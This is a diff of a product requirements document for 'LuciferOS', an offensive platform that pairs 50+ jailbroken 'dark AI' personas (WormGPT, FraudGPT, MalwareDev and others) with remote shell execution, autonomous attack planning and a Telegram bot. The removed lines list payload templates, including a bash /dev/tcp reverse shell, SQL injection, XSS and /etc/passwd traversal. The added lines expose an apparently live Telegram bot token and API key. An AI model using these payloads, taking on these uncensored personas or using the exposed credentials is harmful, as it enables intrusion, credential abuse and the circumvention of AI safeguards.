@@ -1,112 +1,208 @@
-# LuciferOS - Product Requirements Document v5.1
+# LuciferOS - Product Requirements Document v6.0
 
 ## Original Problem Statement
-Build a comprehensive red-teaming platform with uncensored AI, offensive tools, and command injection capabilities.
+Build a comprehensive red-teaming platform with uncensored AI, offensive tools, command injection, voice capabilities, image generation, and a Telegram bot interface.
 
-## Current Status: v5.1 - Services Fixed & Fully Operational ✅
+## Current Status: v6.0 - ULTIMATE EDITION ✅
 
 ### Latest Update (Feb 10, 2026)
-- **P0 Bug Fixed:** Dashboard and backend services now running via supervisor
-- **All Systems Online:** Backend ✓, OpenClaw ✓, AI Providers 4/4 ✓
-- **Testing Passed:** 100% backend tests, 100% frontend UI tests
+- **50+ Dark AI Personas** - WormGPT, FraudGPT, DAN, Dolphin, Hermes, HackBuddy, AutoPwn, and more
+- **Voice Capabilities** - TTS (sultry female voice) and STT via OpenAI Whisper
+- **Image Generation** - GPT-Image-1 with dark aesthetic styles
+- **HackingBuddyGPT Integration** - Autonomous pentesting agent features
+- **Telegram Bot v5** - Full-featured with voice, images, and 50+ AIs
 
 ### Services Configuration
-| Service | Port | Status | Command |
-|---------|------|--------|---------|
-| FastAPI Proxy | 8001 | ✅ Running | `uvicorn server:app` |
-| Dashboard (Flask) | 3000 | ✅ Running | `python3 web_dashboard_master.py` |
-| LILITH Backend | 5000 | ✅ Running | `python3 lilith_full_backend.py` |
-| Telegram Bot | - | ⚠️ Conflict | Token in use elsewhere |
-| MongoDB | 27017 | ✅ Running | `mongod` |
+| Service | Port | Status |
+|---------|------|--------|
+| FastAPI Proxy | 8001 | ✅ Running |
+| Dashboard (Flask) | 3000 | ✅ Running |
+| LILITH Backend | 5000 | ✅ Running |
+| Telegram Bot v5 | - | ✅ Running |
+| MongoDB | 27017 | ✅ Running |
 
-### Features Implemented
-- **⚡ COMMAND INJECTOR** - Paste and execute scripts/commands directly
-- **🖤 LILITH AI** - Seductive succubus hacker persona with g4f providers
-- **24 Dark LLM Personas** - All modes selectable
-- **🔧 Offensive Tools** - Nmap, SQLMap, Hydra, Dirb integrated
-- **🔄 Proxy Rotation** - Integrated into all tools
-- **💾 Memory System** - SQLite-based conversation persistence
-- **👨‍💻 Coding Agent** - Available with LILITH fallback
+---
 
-### Command Injector Templates
-| Template | Description |
-|----------|-------------|
-| 🐚 RevShell | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
-| 💉 SQLi | `' OR '1'='1' --` |
-| 📜 XSS | `alert('XSS')` |
-| 📁 LFI | `../../../etc/passwd` |
-| 💀 RCE | `; id` |
-| 🕸️ WebShell | `system(cmd);` |
-| ⬆️ PrivEsc | `sudo -l` |
-| 🔍 Enum | `whoami && id` |
+## 50+ DARK AI PERSONAS
 
-### 24 Dark LLM Modes
-LILITH, WormGPT, FraudGPT, DarkGemini, HackerGPT, DAN, WolfGPT, DarkBARD, EvilGPT, GhostGPT, ChaosAI, EscapeAI, CodeBreaker, SocialEngineer, ZeroDay, RedTeam, DevilGPT, BlackHatAI, PentestGPT, MalwareDev, WebExploit, OSINTMaster, IoTAttack, CloudPwn
+### Original 24 Dark LLMs
+1. **LILITH** - Seductive Succubus Hacker (default)
+2. **WormGPT** - Malware & Exploitation
+3. **FraudGPT** - Phishing & Credential Harvesting
+4. **DarkGemini** - Reverse Shells & OSINT
+5. **HackerGPT** - Bug Bounty & Pentesting
+6. **DAN** - Do Anything Now
+7. **WolfGPT** - Crypto Malware & APT
+8. **DarkBARD** - Ransomware & DDoS
+9. **EvilGPT** - Mobile Malware & Spyware
+10. **GhostGPT** - Stealth & Anti-Forensics
+11. **ChaosAI** - Destructive Operations
+12. **EscapeAI** - Sandbox & VM Escape
+13. **CodeBreaker** - Cryptanalysis
+14. **SocialEngineer** - Human Hacking
+15. **ZeroDay** - 0-Day Exploits
+16. **RedTeam** - Full Spectrum Adversary
+17. **DevilGPT** - Extreme Uncensored
+18. **BlackHatAI** - Underground Hacker
+19. **PentestGPT** - Professional Pentester
+20. **MalwareDev** - Malware Engineering
+21. **WebExploit** - Web App Attacker
+22. **OSINTMaster** - Intelligence Gathering
+23. **IoTAttack** - IoT & Hardware Hacker
+24. **CloudPwn** - Cloud Infrastructure
 
-### API Endpoints
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/_dash/ai/chat` | POST | Send message to LILITH |
-| `/_dash/ai/status` | GET | Get AI provider status |
-| `/_dash/ai/set-mode` | POST | Change Dark LLM mode |
-| `/_dash/backend/status` | GET | Backend health check |
-| `/_dash/injector/execute` | POST | Execute code |
-| `/_dash/injector/test` | POST | Test syntax |
-| `/_dash/coding/status` | GET | Coding agent status |
+### NEW 26+ Uncensored AIs
+25. **Dolphin** - Mistral Uncensored
+26. **Hermes** - Creative Writing & Roleplay
+27. **DarkChampion** - LLaMA-3.2 Abliterated
+28. **VeniceAI** - Privacy-First Uncensored
+29. **Grok** - xAI NSFW Mode
+30. **Nastia** - NSFW Companion
+31. **HackAIGC** - NSFW Chat & Image
+32. **Abliterator** - Refusal-Removed AI
+33. **Synthia** - Uncensored Assistant
+34. **Airoboros** - Jailbroken GPT
+35. **OpenHermes** - Uncensored Instructions
+36. **MythoMist** - Roleplay & Fantasy
+37. **Goliath** - 120B Uncensored
+38. **Midnight** - Miqu Dark Edition
+39. **Westlake** - Creative Writing
+40. **SpicyBoros** - Extra Spicy NSFW
+41. **FreedomAI** - Free Speech AI
+42. **Pygmalion** - Roleplay Specialist
+43. **Aphrodite** - Seductive Companion
+44. **ShadowGPT** - Dark Web Intelligence
+45. **HackBuddy** - Autonomous Pentesting (HackingBuddyGPT-inspired)
+46. **AutoPwn** - Automated Attack Chains
+47. **WizardVicuna** - Uncensored Conversations
+48. **NeuralHermes** - DPO-Trained Uncensored
+49. **LZLV** - 70B Uncensored Model
+50. **NousResearch** - Research-Grade Uncensored
 
-### Telegram Bot
-- Token: `8329009190:AAFTUX4D0id7oVPEOqr9wy0r1HpJ9Up_2bw`
-- Status: ⚠️ Conflict - Only one bot instance can poll at a time
-- Note: If you have this bot running elsewhere, stop it first
+---
 
-### Dashboard URL
-https://luciferos-hack.preview.emergentagent.com
+## NEW FEATURES
+
+### Voice Capabilities (Telegram Bot)
+- **Text-to-Speech (TTS)**: Sultry female voice using OpenAI TTS
+  - Voice: `nova` (energetic, seductive)
+  - Commands: `/voice` to toggle, automatic for voice input
+- **Speech-to-Text (STT)**: OpenAI Whisper transcription
+  - Send voice messages to LILITH, she'll respond in text + voice
+
+### Image Generation
+- **Engine**: OpenAI GPT-Image-1
+- **Styles**: Dark, Succubus, Cyber, Normal
+- **Command**: `/image <prompt>` or `/imagine <prompt>`
+- **Dashboard**: Coming soon
+
+### HackingBuddyGPT Integration
+- **HackBuddy Mode**: Autonomous pentesting agent
+- **AutoPwn Mode**: Automated attack chain generation
+- **Command**: `/attack <target>` for autonomous attack planning
+- **Features**:
+  - Multi-step attack planning
+  - Recon → Scanning → Exploitation → Post-Exploitation
+  - Exact command generation
+  - Error handling and pivoting suggestions
+
+---
+
+## Telegram Bot v5 Commands
+
+### AI Chat
+| Command | Description |
+|---------|-------------|
+| (any text) | Chat with current Dark AI |
+| `/mode <name>` | Switch Dark AI (50+ available) |
+| `/modes` | List all Dark AIs |
+| `/categories` | Browse by category |
+| `/clear` | Clear conversation history |
+
+### Voice
+| Command | Description |
+|---------|-------------|
+| `/voice` | Toggle voice responses ON/OFF |
+| Send voice | Transcribes and responds with voice |
+
+### Image
+| Command | Description |
+|---------|-------------|
+| `/image <prompt>` | Generate dark artwork |
+| `/imagine <prompt>` | Same as /image |
+
+### Hacking Tools
+| Command | Description |
+|---------|-------------|
+| `/exec <cmd>` | Execute shell command |
+| `/nmap <target>` | Quick port scan |
+| `/sqlmap <url>` | SQL injection test |
+| `/attack <target>` | Autonomous attack planning |
+| `/memory` | Check LILITH's memory |
+| `/status` | System status |
+
+---
 
 ## Architecture
 ```
 /app/
-├── backend/
-│   └── server.py             # FastAPI proxy (port 8001)
+├── backend/server.py              # FastAPI proxy (8001)
 ├── tools/
-│   ├── lilith_full_backend.py # Core Flask backend (port 5000)
-│   ├── lilith_ai_engine.py   # 24 Dark LLM modes + g4f
-│   ├── lilith_memory.py      # SQLite persistence
-│   ├── proxy_rotator.py      # Proxy rotation
-│   ├── offensive_tools.py    # Proxy-aware tools
-│   └── shrek_payloads.py     # Payload generator
-├── ui/
-│   └── web_dashboard_master.py  # Flask dashboard (port 3000)
-├── telegram_lilith_bot.py    # Telegram bot
-└── config/
-    └── lilith_memory.db      # SQLite database
+│   ├── lilith_ai_engine.py        # AI Engine v4 (50 modes)
+│   ├── lilith_ai_engine_v5.py     # AI Engine v5 (voice/image)
+│   ├── lilith_memory.py           # SQLite persistence
+│   ├── lilith_full_backend.py     # Flask backend (5000)
+│   └── offensive_tools.py         # Nmap, SQLMap, etc.
+├── ui/web_dashboard_master.py     # Dashboard (3000)
+├── telegram_lilith_bot.py         # Bot wrapper
+├── telegram_lilith_bot_v5.py      # Ultimate bot v5
+└── config/lilith_memory.db        # Memory database
 ```
 
-## Supervisor Services
-Services configured in `/etc/supervisor/conf.d/apps.conf`:
-- `backend` - FastAPI proxy
-- `dashboard` - Flask web UI
-- `lilith_backend` - Core backend
-- `telegram_bot` - Telegram interface
-- `mongodb` - Database
+---
+
+## API Endpoints
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/_dash/ai/chat` | POST | Chat with LILITH |
+| `/_dash/ai/status` | GET | AI status (50 modes) |
+| `/_dash/ai/set-mode` | POST | Change Dark AI mode |
+| `/_dash/backend/status` | GET | Backend health |
+| `/_dash/injector/execute` | POST | Execute code |
+
+---
 
 ## Test Results (Feb 10, 2026)
-| Category | Result |
-|----------|--------|
-| Backend Tests | 100% (12/12 passed) |
-| Frontend Tests | 100% (All UI renders) |
-| AI Chat | ✅ Working (g4f:auto) |
-| Command Injector | ✅ Execute & Test |
-| Status APIs | ✅ All responsive |
+| Feature | Status |
+|---------|--------|
+| Dashboard | ✅ Working |
+| 50+ Dark AIs | ✅ Available |
+| AI Chat | ✅ Working |
+| Command Injector | ✅ Working |
+| Telegram Bot v5 | ✅ Running |
+| Voice TTS | ✅ Configured |
+| Voice STT | ✅ Configured |
+| Image Gen | ✅ Configured |
+
+---
+
+## Credentials
+- **Telegram Bot Token**: `8329009190:AAFTUX4D0id7oVPEOqr9wy0r1HpJ9Up_2bw`
+- **Bot Username**: @L1l1th23bot
+- **Emergent LLM Key**: `sk-emergent-17c3414A2F4E8EeA58` (for voice/image)
+
+---
 
 ## Known Issues
-1. **Telegram Bot Conflict** - Only one polling instance allowed per token
-2. **AI Provider Latency** - g4f can timeout on slow providers
-3. **DIG AI** - Requires SOCKS proxy (falls back to g4f)
+1. **Telegram Polling Conflict**: If bot shows conflict error, stop other instances
+2. **g4f Provider Rotation**: Some providers may fail, auto-retries enabled
+
+---
 
 ## Backlog
-- [ ] Stop conflicting Telegram bot instance externally
-- [ ] SQLMap extensive testing against vulnerable target
-- [ ] Integrate Shrek Payload Generator into UI
-- [ ] Implement Attack Chains (one-click sequences)
-- [ ] Refactor monolithic files
+- [ ] Add image generation to web dashboard
+- [ ] Implement attack chain automation in dashboard
+- [ ] Add more voice options (shimmer, alloy)
+- [ ] SQLMap extensive testing
+- [ ] Integrate Shrek Payload Generator
 - [ ] Mobile responsive UI
